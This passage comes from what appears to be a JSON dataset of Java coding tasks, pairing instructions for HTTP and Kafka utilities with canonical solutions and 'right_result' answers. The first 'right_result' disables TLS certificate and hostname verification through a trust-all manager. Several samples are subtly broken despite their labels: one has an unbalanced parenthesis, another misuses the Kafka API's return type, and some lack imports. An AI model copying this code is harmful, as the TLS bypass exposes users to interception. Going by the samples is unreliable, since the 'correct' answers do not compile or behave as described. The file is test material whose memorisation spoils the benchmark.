{\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class XxlJobRemotingUtil {\n    private static final Logger logger = LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    public static final String XXL_JOB_ACCESS_TOKEN = \"XXL-JOB-ACCESS-TOKEN\";\n    private static final TrustManager[] trustAllCerts = new TrustManager[]{\n        new X509TrustManager() {\n            public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n            public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}\n        }\n    };\n\n    public static <ReturnT> ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class<ReturnT> returnTargClassOfT) throws Exception {\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        if (\"https\".equalsIgnoreCase(obj.getProtocol())) {\n            HttpsURLConnection httpsCon = (HttpsURLConnection) con;\n            trustAllHosts(httpsCon);\n        }\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"application/json; utf-8\");\n        con.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n        con.setDoOutput(true);\n        con.setReadTimeout(timeout * 1000);\n\n        try (OutputStream os = con.getOutputStream()) {\n            byte[] input = new ObjectMapper().writeValueAsString(requestObj).getBytes(\"utf-8\");\n            os.write(input, 0, input.length);           \n        }\n\n        try (BufferedReader br = new BufferedReader(\n                new InputStreamReader(con.getInputStream(), \"utf-8\"))) {\n            StringBuilder response = new StringBuilder();\n            String responseLine = null;\n            while ((responseLine = br.readLine()) != null) {\n                response.append(responseLine.trim());\n            }\n            return new ObjectMapper().readValue(response.toString(), returnTargClassOfT);\n        } catch (Exception e) {\n            logger.error(\"Error during POST request: \", e);\n            throw e;\n        } finally {\n            con.disconnect();\n        }\n    }\n\n    private static void trustAllHosts(HttpsURLConnection connection) throws Exception {\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new java.security.SecureRandom());\n        connection.setSSLSocketFactory(sc.getSocketFactory());\n        connection.setHostnameVerifier((hostname, session) -> true);\n    }\n}\n```"
  },
  {
    "Task_id": 68,
    "Instruction": "Task Description: Create a utility class for making HTTP POST requests with configurable timeouts and form data submission capabilities.\n\nClass Description: TinyIdHttpUtils is a utility class that provides static methods for performing HTTP POST requests. It handles connection management, timeout configuration, form data encoding, and response reading. The class is designed to be thread-safe and includes proper resource cleanup.\n\nAttributes:\n- logger: Logger - Used for logging errors and warnings during HTTP operations\n\nMethods:\n- post(String url, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request to the specified URL with given timeout values\n- post(String url, Map<String,String> form, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request with form data to the specified URL with given timeout values",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class TinyIdHttpUtils {\n\n    private static final Logger logger = Logger.getLogger(TinyIdHttpUtils.class.getName());\n\n    private TinyIdHttpUtils() {\n    }\n\n    public static String post(String url, Integer readTimeout, Integer connectTimeout) {\n        return post(url, null, readTimeout, connectTimeout);\n    }\n\n    public static String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) {\n        HttpURLConnection conn = null;\n        OutputStreamWriter os = null;\n        BufferedReader rd = null;\n        StringBuilder param = new StringBuilder();\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        String response = null;\n        if (form != null) {\n            for (Map.Entry<String, String> entry : form.entrySet()) {\n                String key = entry.getKey();\n                if (param.length() != 0) {\n                    param.append(\"&\");\n                }\n                param.append(key).append(\"=\").append(entry.getValue());\n            }\n        }\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setReadTimeout(readTimeout);\n            conn.setConnectTimeout(connectTimeout);\n            conn.setUseCaches(false);\n            conn.connect();\n            os = new OutputStreamWriter(conn.getOutputStream(), \"UTF-8\");\n            os.write(param.toString());\n            os.flush();\n            rd = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"UTF-8\"));\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            }\n            response = sb.toString();\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"error post url:\" + url + param, e);\n        } finally {\n            try {\n                if (os != null) {\n                    os.close();\n                }\n                if (rd != null) {\n                    rd.close();\n                }\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            } catch (IOException e) {\n                logger.log(Level.WARNING, \"error close conn\", e);\n            }\n        }\n        return response;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic final class TinyIdHttpUtils {\n    private static final Logger logger = LoggerFactory.getLogger(TinyIdHttpUtils.class);\n\n    private TinyIdHttpUtils() {}\n\n    public static String post(String url, Integer readTimeout, Integer connectTimeout) throws IOException {\n        return post(url, null, readTimeout, connectTimeout);\n    }\n\n    public static String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) throws IOException {\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            if (readTimeout != null) {\n                conn.setReadTimeout(readTimeout);\n            }\n            if (connectTimeout != null) {\n                conn.setConnectTimeout(connectTimeout);\n            }\n            if (form != null) {\n                StringBuilder postData = new StringBuilder();\n                for (Map.Entry<String, String> param : form.entrySet()) {\n                    if (postData.length() != 0) postData.append('&');\n                    postData.append(param.getKey());\n                    postData.append('=');\n                    postData.append(param.getValue());\n                }\n                byte[] postDataBytes = postData.toString().getBytes(\"UTF-8\");\n                conn.getOutputStream().write(postDataBytes);\n            }\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                Scanner scanner = new Scanner(conn.getInputStream(), \"UTF-8\").useDelimiter(\"\\\\A\");\n                return scanner.hasNext() ? scanner.next() : \"\";\n            } else {\n                throw new IOException(\"Failed to post to \" + url + \", response code: \" + responseCode);\n            }\n        } catch (IOException e) {\n            logger.error(\"Error posting to \" + url, e);\n            throw e;\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java, specifying topic configuration such as name, partitions, replication factor, and retention time.\n\nFunction Description: This function creates a new Kafka topic with the specified configuration using the Kafka AdminClient. It handles the creation process, including setting up the AdminClient, defining the topic properties, and executing the topic creation while managing exceptions and resource cleanup.\n\nInput:\n- kafkaClientInfo: [KafkaClientInfo] - Contains connection and configuration details for the Kafka broker\n- newTopicInfo: [NewTopicInfo] - Contains the topic configuration including name, partitions, replication factor, and retention time in milliseconds\n\nOutput:\n- [boolean] - Returns true if the topic was successfully created, false if an error occurred",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.config.TopicConfig;\n\nprivate final KafkaStoragePlugin plugin;\n\npublic boolean createTopicName(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n    boolean status = false;\n    AdminClient adminClient = null;\n    try {\n        adminClient = AdminClient.create(plugin.getKafkaAdminClientProps(kafkaClientInfo));\n        NewTopic newTopic = new NewTopic(newTopicInfo.getTopicName(), newTopicInfo.getPartitions(), newTopicInfo.getReplication());\n        newTopic.configs(Collections.singletonMap(TopicConfig.RETENTION_MS_CONFIG, String.valueOf(newTopicInfo.getRetainMs())));\n        adminClient.createTopics(Collections.singleton(newTopic)).all().get();\n        status = true;\n    } catch (Exception e) {\n        status = false;\n        log.error(\"Create kafka topic has error, new topic [{}], msg is {}\", newTopicInfo, e);\n    } finally {\n        adminClient.close();\n    }\n    return status;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.*;\n\npublic class KafkaTopicCreator {\n\n    public static boolean createTopic(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaClientInfo.getBootstrapServers());\n        \n        try (AdminClient adminClient = AdminClient.create(props)) {\n            NewTopic newTopic = new NewTopic(newTopicInfo.getName(), \n                                            newTopicInfo.getNumPartitions(), \n                                            newTopicInfo.getReplicationFactor())\n                .configs(Collections.singletonMap(TopicConfig.RETENTION_MS_CONFIG, String.valueOf(newTopicInfo.getRetentionTime())));\n            \n            CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n            Map<String, TopicDescription> results = result.all().get();\n            \n            return results.containsKey(newTopicInfo.getName()) && results.get(newTopicInfo.getName()).partitions().size() == newTopicInfo.getNumPartitions();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    // Assuming KafkaClientInfo and NewTopicInfo classes are defined elsewhere\n}\n\nclass KafkaClientInfo {\n    private String bootstrapServers;\n\n    public KafkaClientInfo(String bootstrapServers) {\n        this.bootstrapServers = bootstrapServers;\n    }\n\n    public String getBootstrapServers() {\n        return bootstrapServers;\n    }\n}\n\nclass NewTopicInfo {\n    private String name;\n    private int numPartitions;\n    private short replicationFactor;\n    private long retentionTime;\n\n    public NewTopicInfo(String name, int numPartitions, short replicationFactor, long retentionTime) {\n        this.name = name;\n        this.numPartitions = numPartitions;\n        this.replicationFactor = replicationFactor;\n        this.retentionTime = retentionTime;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getNumPartitions() {\n        return numPartitions;\n    }\n\n    public short getReplicationFactor() {\n        return replicationFactor;\n    }\n\n    public long getRetentionTime() {\n        return retentionTime;\n    }\n}\n```"
  },
  {
    "Task_id": 70,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response from the input stream, and return it as a UTF-8 encoded string. Proper error handling and resource cleanup should be implemented.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent.\n\nOutput: \n- String - The response from the HTTP GET request, or null if an error occurs.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpGetExample {\n\n    public static String performHttpGet(String requestUrl) {\n        StringBuilder result = new StringBuilder();\n        HttpURLConnection urlConnection = null;\n        try {\n            URL url = new URL(requestUrl);\n            urlConnection = (HttpURLConnection) url.openConnection();\n            urlConnection.setRequestMethod(\"GET\");\n            int responseCode = urlConnection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream(), \"UTF-8\"));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line).append(\"\\n\");\n                }\n                reader.close();\n            } else {\n                System.out.println(\"Failed : HTTP error code : \" + responseCode);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n        return result.toString().trim();\n    }\n\n    public static void main(String[] args) {\n        String response = performHttpGet(\"https://api.example.com/data\");\n        System.out.println(response);\n    }\n}\n```"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a Java utility class for making asynchronous HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable headers and parameters. The class should handle response processing and error handling through callbacks.\n\nClass Description: HttpURLConnectionUtils is a final utility class that provides static methods for performing asynchronous HTTP requests. It encapsulates the complexity of HttpURLConnection and provides a simple callback-based interface for handling responses and errors.\n\nAttributes:\n\nTIMEOUT_IN_MILLIONS: int - The connection and read timeout duration in milliseconds (default: 5000)\n\nMethods:\n\ndoGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous HTTP GET request to the specified URL and invokes the callback with the response or error.\n\ndoPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous HTTP POST request to the specified URL with the given parameters and invokes the callback with the response or error.\n\nrequest(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic for both GET and POST methods, including setting headers, writing parameters, and processing the response.\n\nCallback: interface - Defines two methods for handling request outcomes:\n  onResponse(String result, long response) -> void - Called when the request succeeds\n  onFail(Throwable error) -> void - Called when the request fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(\n            final String urlStr,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(\n            final String urlStr,\n            final String params,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n\n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        request(\"GET\", urlStr, null, null, callback);\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        request(\"POST\", urlStr, null, params, callback);\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(method);\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        conn.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n\n                if (\"POST\".equalsIgnoreCase(method)) {\n                    conn.setDoOutput(true);\n                    DataOutputStream wr = new DataOutputStream(conn.getOutputStream());\n                    wr.writeBytes(params);\n                    wr.flush();\n                    wr.close();\n                }\n\n                int responseCode = conn.getResponseCode();\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                conn.disconnect();\n\n                callback.onResponse(response.toString(), responseCode);\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n}\n```"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Kafka topic using Java's AdminClient API with configurable properties, partitions, and replication factor.\n\nClass Description: The KafkaTopicCreator class provides functionality to create Kafka topics programmatically. It encapsulates the AdminClient configuration and topic creation logic, handling the connection lifecycle and operation timeout.\n\nAttributes:\n- adminClientProperties: Map<String, Object> - Configuration properties for the AdminClient, initialized from KafkaProperties\n- operationTimeout: int - Timeout duration in seconds for Kafka operations (default: 30)\n\nMethods:\n- createTopic(String topicName, int partitions, short replicationFactor) -> void - Creates a new Kafka topic with the specified name, partition count, and replication factor. Throws Exception if operation fails or times out.\n- getAdminClientProperties() -> Map<String, Object> - Returns an unmodifiable view of the AdminClient configuration properties\n\nConstructor:\n- KafkaTopicCreator(KafkaProperties kafkaProperties) - Initializes the class with Kafka configuration properties",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.CreateTopicsResult;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.springframework.boot.autoconfigure.kafka.KafkaProperties;\nimport java.util.Collections;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class KafkaTopicCreator {\n\n    private final Map<String, Object> adminClientProperties;\n    private final int operationTimeout = 30;\n\n    public KafkaTopicCreator(KafkaProperties kafkaProperties) {\n        this.adminClientProperties = kafkaProperties.buildAdminProperties(null);\n    }\n\n    public void createTopic(String topicName, int partitions, short replicationFactor) throws Exception {\n        try (AdminClient adminClient = AdminClient.create(this.adminClientProperties)) {\n            NewTopic newTopic = new NewTopic(topicName, partitions, replicationFactor);\n            CreateTopicsResult createTopicsResult = adminClient.createTopics(Collections.singletonList(newTopic));\n            KafkaFuture<Void> future = createTopicsResult.all();\n            future.get(this.operationTimeout, TimeUnit.SECONDS);\n        }\n    }\n\n    public Map<String, Object> getAdminClientProperties() {\n        return Collections.unmodifiableMap(this.adminClientProperties);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.*;\n\npublic class KafkaTopicCreator {\n    private final Map<String, Object> adminClientProperties;\n    private final int operationTimeout = 30;\n\n    public KafkaTopicCreator(KafkaProperties kafkaProperties) {\n        this.adminClientProperties = Collections.unmodifiableMap(kafkaProperties.getAdminClientProps());\n    }\n\n    public void createTopic(String topicName, int partitions, short replicationFactor) throws Exception {\n        Properties props = new Properties();\n        props.putAll(adminClientProperties);\n        try (AdminClient adminClient = AdminClient.create(props)) {\n            NewTopic newTopic = new NewTopic(topicName, partitions, replicationFactor)\n                    .configs(Collections.singletonMap(AdminClientConfig.REQUEST_TIMEOUT_MS_CONFIG, String.valueOf(operationTimeout * 1000)));\n            CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n            result.all().get();\n        }\n    }\n\n    public Map<String, Object> getAdminClientProperties() {\n        return adminClientProperties;\n    }\n}\n```"
  },
  {
    "Task_id": 83,
    "Instruction": "Task Description: Create a utility class in Java that handles HTTP requests using HttpURLConnection, with support for custom headers and timeouts.\n\nClass Description: HttpHelper is a final utility class that provides static methods for making HTTP requests. It encapsulates the complexity of HttpURLConnection and provides error handling. The class cannot be instantiated.\n\nAttributes: None (This is a utility class with only static methods)\n\nMethods:\nMethod1: getHttpContents(String method, String endpoint, Map<String, String> headers) -> String - Makes an HTTP request to the specified endpoint using the given method and headers. Returns the response content as a String.\n  - Parameters:\n    - method: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n    - endpoint: String - The URL to send the request to\n    - headers: Map<String, String> - Optional map of request headers (can be null)\n  - Returns: String - The response content from the server\n  - Throws: MongoClientException if an IOException occurs during the request",
    "Canonical_solution": "import com.mongodb.MongoClientException;\nimport com.mongodb.lang.NonNull;\nimport com.mongodb.lang.Nullable;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\nfinal class HttpHelper {\n\n    private HttpHelper() {\n    }\n\n    @NonNull\n    public static String getHttpContents(final String method, final String endpoint, @Nullable final Map<String, String> headers) {\n        StringBuilder content = new StringBuilder();\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(endpoint).openConnection();\n            conn.setConnectTimeout(10000);\n            conn.setReadTimeout(10000);\n            conn.setRequestMethod(method);\n            if (headers != null) {\n                for (Map.Entry<String, String> kvp : headers.entrySet()) {\n                    conn.setRequestProperty(kvp.getKey(), kvp.getValue());\n                }\n            }\n\n            int status = conn.getResponseCode();\n            if (status != HttpURLConnection.HTTP_OK) {\n                throw new IOException(String.format(\"%d %s\", status, conn.getResponseMessage()));\n            }\n\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    content.append(inputLine);\n                }\n            }\n        } catch (IOException e) {\n            throw new MongoClientException(\"Unexpected IOException from endpoint \" + endpoint + \".\", e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        return content.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpHelper {\n\n    private HttpHelper() {\n        throw new UnsupportedOperationException(\"Utility class\");\n    }\n\n    public static String getHttpContents(String method, String endpoint, Map<String, String> headers) throws IOException {\n        URL url = new URL(endpoint);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(method);\n\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                connection.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n\n        connection.setConnectTimeout(5000); // 5 seconds\n        connection.setReadTimeout(5000); // 5 seconds\n\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            StringBuilder response = new StringBuilder();\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            return response.toString();\n        } finally {\n            connection.disconnect();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making network requests, with support for gzip compression, proxy interaction, and error handling.\n\nClass Description: The HttpService class provides HTTP client capabilities for making POST requests to specified endpoints. It handles request construction, connection management, response processing, and includes features like gzip compression, SSL socket configuration, proxy server interaction, and automatic retries for failed requests.\n\nAttributes:\n\nshouldGzipRequestPayload: boolean - Determines whether request payload should be gzip compressed\nMIN_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Minimum HTTP response code considered as service unavailable (500)\nMAX_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Maximum HTTP response code considered as service unavailable (599)\nLOGTAG: String - Tag used for logging messages\nHTTP_OUTPUT_STREAM_BUFFER_SIZE: int - Buffer size for output streams (8192 bytes)\nCONTENT_ENCODING_HEADER: String - Header key for content encoding\nGZIP_CONTENT_TYPE_HEADER: String - Value for gzip content encoding\n\nMethods:\n\nperformRequest: performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) -> byte[] - Makes an HTTP POST request to the specified endpoint with optional parameters and SSL configuration. Handles retries for failed requests and returns the response body as bytes. Throws ServiceUnavailableException for 5xx responses and IOException for other failures.\n\ngetBufferedOutputStream: getBufferedOutputStream(OutputStream out) -> OutputStream - Creates a buffered output stream, optionally wrapped in a GZIPOutputStream based on shouldGzipRequestPayload.\n\nisProxyRequest: isProxyRequest(String endpointUrl) -> boolean - Determines if the request is a proxy request by checking the endpoint URL.\n\nslurp: slurp(InputStream inputStream) -> byte[] - Reads all bytes from an input stream and returns them as a byte array.",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.net.Uri;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPOutputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class HttpService implements RemoteService {\n\n    private final boolean shouldGzipRequestPayload;\n    private static final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = HttpURLConnection.HTTP_INTERNAL_ERROR;\n    private static final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private static final String LOGTAG = \"MixpanelAPI.Message\";\n    private static final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private static final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private static final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public HttpService(boolean shouldGzipRequestPayload) {\n        this.shouldGzipRequestPayload = shouldGzipRequestPayload;\n    }\n\n    @Override\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws ServiceUnavailableException, IOException {\n        MPLog.v(LOGTAG, \"Attempting request to \" + endpointUrl);\n\n        byte[] response = null;\n        int retries = 0;\n        boolean succeeded = false;\n        while (retries < 3 && !succeeded) {\n            InputStream in = null;\n            OutputStream out = null;\n            OutputStream bout = null;\n            HttpURLConnection connection = null;\n\n            try {\n                final URL url = new URL(endpointUrl);\n                connection = (HttpURLConnection) url.openConnection();\n                if (null != socketFactory && connection instanceof HttpsURLConnection) {\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(socketFactory);\n                }\n\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    Map<String,String> headers = interactor.getProxyRequestHeaders();\n                    if (headers != null) {\n                        for (Map.Entry<String, String> entry : headers.entrySet()) {\n                            connection.setRequestProperty(entry.getKey(), entry.getValue());\n                        }\n                    }\n                }\n\n                connection.setConnectTimeout(2000);\n                connection.setReadTimeout(30000);\n                if (null != params) {\n                    